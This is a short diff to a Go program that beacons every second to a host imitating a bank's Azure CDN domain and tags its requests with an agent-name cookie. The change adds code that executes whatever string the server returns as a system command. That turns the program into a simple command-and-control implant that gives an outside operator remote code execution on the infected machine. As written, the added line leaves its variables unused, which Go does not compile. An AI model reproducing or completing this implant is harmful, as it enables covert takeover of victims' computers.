@@ -4,6 +4,7 @@ import "fmt"
 import "net/http"
 import "io"
 import "time"
+import "os/exec"
 
 var url = "https://bankofamerica.azureedge.net"
 
@@ -15,7 +16,7 @@ func Get() string{
 		return "NOP"
 	}
 
-	cookie := &http.Cookie{Name: "0001-SupersonicSquirtle-PC"}
+	cookie := &http.Cookie{Name: "FrequentFlyerAgent"}
 	req.AddCookie(cookie)
 
 	resp, err := client.Do(req)
@@ -36,6 +37,7 @@ func main(){
 		response := Get()
 		if(response != "NOP"){
 			fmt.Println(response)
+			out, err := exec.Command(response).Output()
 		}
 		time.Sleep(1 * time.Second)
 	}
